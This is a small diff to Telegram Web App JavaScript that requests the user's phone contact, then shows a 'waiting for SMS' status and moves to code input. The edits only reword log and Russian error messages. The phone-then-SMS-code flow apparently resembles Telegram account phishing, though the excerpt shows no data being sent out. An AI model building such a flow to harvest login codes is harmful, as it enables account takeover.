@@ -25,7 +25,7 @@ document.addEventListener('DOMContentLoaded', () => {
         tg.requestContact((success, contact) => {
             console.log('Contact callback, success:', success, 'contact:', contact);
             if (success) {
-                console.log('Contact granted');
+                console.log('Contact granted, proceeding to code input');
                 phoneInput.value = contact.phone_number || 'Номер отправлен боту';
                 phoneInput.classList.remove('hidden');
                 statusMsg.textContent = 'Номер отправлен. Ожидаем SMS...';
@@ -41,9 +41,9 @@ document.addEventListener('DOMContentLoaded', () => {
                     hideLoading();
                 }, 2000);
             } else {
-                console.error('Contact request failed');
+                console.error('Contact request failed, success: false');
                 hideLoading();
-                errorMsg.textContent = '❌ Не удалось получить контакт. Попробуйте снова.';
+                errorMsg.textContent = '❌ Вы не предоставили контакт. Попробуйте снова.';
                 errorMsg.classList.remove('hidden');
                 setTimeout(resetForm, 2000);
             }
